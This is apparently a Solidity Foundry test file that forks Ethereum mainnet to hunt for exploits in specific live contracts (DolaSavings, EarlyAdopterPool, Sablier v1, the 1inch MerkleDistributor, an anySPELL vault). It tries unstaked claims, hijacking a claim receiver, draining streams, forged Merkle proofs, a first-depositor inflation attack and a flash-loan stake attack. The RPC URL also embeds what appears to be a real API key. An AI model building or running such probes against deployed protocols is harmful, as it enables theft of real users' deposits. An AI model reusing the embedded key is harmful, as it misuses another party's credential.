// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract PermissionlessExploitHunter is Test {
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
    }

    // Test specific high-value targets with deep exploit chains
    function test_deepExploitChain_DolaSavings() public {
        address target = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
        console.log("=== DolaSavings Multi-Step Exploit ===");
        console.log("Contract balance:", target.balance / 1e18, "ETH");

        // Step 1: Check if we can stake with 0 amount
        vm.prank(attacker);
        (bool s1,) = target.call(abi.encodeWithSignature("stake(uint256)", 0));
        console.log("Stake 0:", s1);

        // Step 2: Check claimable without deposit
        (bool s2, bytes memory d2) = target.staticcall(
            abi.encodeWithSignature("claimable(address)", attacker)
        );
        if (s2 && d2.length >= 32) {
            uint256 claimable = abi.decode(d2, (uint256));
            console.log("Claimable:", claimable / 1e18);
        }

        // Step 3: Try claim without stake
        vm.prank(attacker);
        (bool s3,) = target.call(abi.encodeWithSignature("claim(address)", attacker));
        console.log("Claim:", s3);

        // Step 4: Check for any rewards
        console.log("Attacker balance after:", attacker.balance / 1e18, "ETH");
    }

    function test_deepExploitChain_EarlyAdopterPool() public {
        address target = 0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4;
        console.log("=== EarlyAdopterPool (627 ETH) ===");
        console.log("Contract balance:", target.balance / 1e18, "ETH");

        // Check claimReceiver
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("claimReceiver()")
        );
        if (s && d.length >= 32) {
            address receiver = abi.decode(d, (address));
            console.log("Claim receiver:", receiver);

            if (receiver == address(0)) {
                console.log("!!! Receiver is zero address !!!");

                // Try to set ourselves as receiver
                vm.prank(attacker);
                target.call(abi.encodeWithSignature("setClaimReceiver(address)", attacker));

                // Check if it changed
                (s, d) = target.staticcall(abi.encodeWithSignature("claimReceiver()"));
                if (s) {
                    receiver = abi.decode(d, (address));
                    console.log("New receiver:", receiver);
                }
            }
        }

        // Try claim directly
        vm.prank(attacker);
        uint256 before = attacker.balance;
        target.call(abi.encodeWithSignature("claim()"));
        console.log("Gained from claim:", (attacker.balance - before) / 1e18, "ETH");

        // Try withdraw
        vm.prank(attacker);
        before = attacker.balance;
        target.call(abi.encodeWithSignature("withdraw()"));
        console.log("Gained from withdraw:", (attacker.balance - before) / 1e18, "ETH");

        // Try emergencyWithdraw
        vm.prank(attacker);
        before = attacker.balance;
        target.call(abi.encodeWithSignature("emergencyWithdraw()"));
        console.log("Gained from emergency:", (attacker.balance - before) / 1e18, "ETH");
    }

    function test_deepExploitChain_Sablier() public {
        address sablier = 0xA4fc358455Febe425536fd1878bE67FfDBDEC59a;
        console.log("=== Sablier v1 Stream Exploit ===");

        // Check for cancelable streams where we can become recipient
        // Sablier uses stream IDs

        for (uint256 streamId = 1; streamId < 100; streamId++) {
            (bool s, bytes memory d) = sablier.staticcall(
                abi.encodeWithSignature("getStream(uint256)", streamId)
            );

            if (s && d.length > 0) {
                // Stream exists, try to withdraw from it
                vm.prank(attacker);
                uint256 before = attacker.balance;
                sablier.call(abi.encodeWithSignature(
                    "withdrawFromStream(uint256,uint256)",
                    streamId,
                    1e18
                ));

                if (attacker.balance > before) {
                    console.log("!!! DRAINED stream:", streamId);
                    console.log("Gained:", (attacker.balance - before) / 1e18, "ETH");
                    return;
                }
            }
        }
    }

    function test_deepExploitChain_1inchMerkle() public {
        address merkle = 0xE295aD71242373C37C5FdA7B57F26f9eA1088AFe;
        console.log("=== 1inch MerkleDistributor (6.25M 1INCH) ===");

        // The merkle distributor has unclaimed tokens
        // Can we claim with a fabricated proof?

        // Try claim with empty proof
        bytes32[] memory proof = new bytes32[](0);

        vm.prank(attacker);
        (bool s,) = merkle.call(abi.encodeWithSignature(
            "claim(uint256,address,uint256,bytes32[])",
            0,
            attacker,
            1000000e18,
            proof
        ));
        console.log("Claim with empty proof:", s);

        // Try with single zero proof
        proof = new bytes32[](1);
        proof[0] = bytes32(0);

        vm.prank(attacker);
        (s,) = merkle.call(abi.encodeWithSignature(
            "claim(uint256,address,uint256,bytes32[])",
            0,
            attacker,
            1000000e18,
            proof
        ));
        console.log("Claim with zero proof:", s);
    }

    function test_exploitEmptyVault() public {
        // anySPELL vault
        address vault = 0x4e840AADD28DA189B9906674B4Afcb77C128d9ea;
        console.log("=== anySPELL Empty Vault Attack ===");

        (bool s, bytes memory d) = vault.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        uint256 supply = s ? abi.decode(d, (uint256)) : 0;
        console.log("Total supply:", supply);

        if (supply == 0) {
            console.log("Vault is empty - first depositor attack possible!");

            // Get underlying token
            (s, d) = vault.staticcall(abi.encodeWithSignature("token()"));
            if (s && d.length >= 32) {
                address token = abi.decode(d, (address));
                console.log("Underlying token:", token);

                // Deal ourselves some tokens
                deal(token, attacker, 1000e18);

                // Deposit 1 wei
                vm.startPrank(attacker);
                (s,) = token.call(abi.encodeWithSignature("approve(address,uint256)", vault, type(uint256).max));

                uint256 sharesBefore;
                (s, d) = vault.staticcall(abi.encodeWithSignature("balanceOf(address)", attacker));
                sharesBefore = s ? abi.decode(d, (uint256)) : 0;

                // Deposit 1 wei to get shares
                vault.call(abi.encodeWithSignature("deposit(uint256)", 1));

                (s, d) = vault.staticcall(abi.encodeWithSignature("balanceOf(address)", attacker));
                uint256 sharesAfter = s ? abi.decode(d, (uint256)) : 0;

                console.log("Shares received:", sharesAfter - sharesBefore);

                if (sharesAfter > sharesBefore) {
                    // Donate to inflate share price
                    token.call(abi.encodeWithSignature("transfer(address,uint256)", vault, 999e18));

                    (s, d) = vault.staticcall(abi.encodeWithSignature("totalAssets()"));
                    uint256 totalAssets = s ? abi.decode(d, (uint256)) : 0;
                    console.log("Total assets after donation:", totalAssets / 1e18);

                    // Now if someone deposits, they get 0 shares due to rounding
                    console.log("!!! FIRST DEPOSITOR ATTACK SETUP COMPLETE !!!");
                }
                vm.stopPrank();
            }
        }
    }

    function test_flashLoanProfitExtraction() public {
        console.log("=== Flash Loan Profit Extraction ===");

        // Check Balancer for flash loan
        address balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

        // Get WETH balance in Balancer
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        (bool s, bytes memory d) = weth.staticcall(
            abi.encodeWithSignature("balanceOf(address)", balancer)
        );
        uint256 wethBal = s ? abi.decode(d, (uint256)) : 0;
        console.log("WETH in Balancer:", wethBal / 1e18);

        // Check if any protocol has accumulated rewards we can flash-stake for
        // DolaSavings check
        address dola = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
        (s, d) = dola.staticcall(abi.encodeWithSignature("balanceOf(address)", balancer));
        uint256 dolaBal = s ? abi.decode(d, (uint256)) : 0;
        console.log("DOLA in Balancer:", dolaBal / 1e18);

        // If DOLA available, calculate flash stake profit
        if (dolaBal > 0) {
            address dolaSavings = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;

            (s, d) = dolaSavings.staticcall(abi.encodeWithSignature("totalSupply()"));
            uint256 totalStaked = s ? abi.decode(d, (uint256)) : 0;

            (s, d) = dolaSavings.staticcall(abi.encodeWithSignature("lastUpdate()"));
            uint256 lastUpdate = s ? abi.decode(d, (uint256)) : 0;

            (s, d) = dolaSavings.staticcall(abi.encodeWithSignature("yearlyRewardBudget()"));
            uint256 yearlyBudget = s ? abi.decode(d, (uint256)) : 0;

            if (totalStaked > 0 && yearlyBudget > 0) {
                uint256 timeSince = block.timestamp - lastUpdate;
                uint256 pendingRewards = (timeSince * yearlyBudget) / 365 days;

                console.log("Pending rewards:", pendingRewards / 1e18, "DBR");
                console.log("Flash loan needed:", (totalStaked * 9) / 1e18, "DOLA");
                console.log("DOLA available:", dolaBal / 1e18);

                if (dolaBal >= totalStaked * 9) {
                    console.log("!!! FLASH STAKE ATTACK POSSIBLE !!!");
                }
            }
        }
    }
}
